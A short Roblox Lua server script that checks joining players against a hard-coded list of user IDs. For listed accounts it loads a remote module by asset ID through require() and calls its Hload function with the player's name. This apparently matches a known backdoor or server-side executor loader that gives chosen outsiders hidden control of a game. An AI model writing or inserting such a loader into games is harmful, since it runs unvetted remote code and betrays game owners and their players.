local Players = game:GetService("Players")
local WL = {
  [3227511162] = true;
  [119494759] = true;
	[31447] = true;
	[10162336255] = true;
	[1624879097] = true;
	[9560977192] = true;
}
local function onPlayer(player)
	if WL[player.UserId] then
      -- require(7634392335)(player.Name)
	  require(135231466738957):Hload(player.Name)
  	end
end

for _, p in ipairs(Players:GetPlayers()) do onPlayer(p) end
Players.PlayerAdded:Connect(onPlayer)
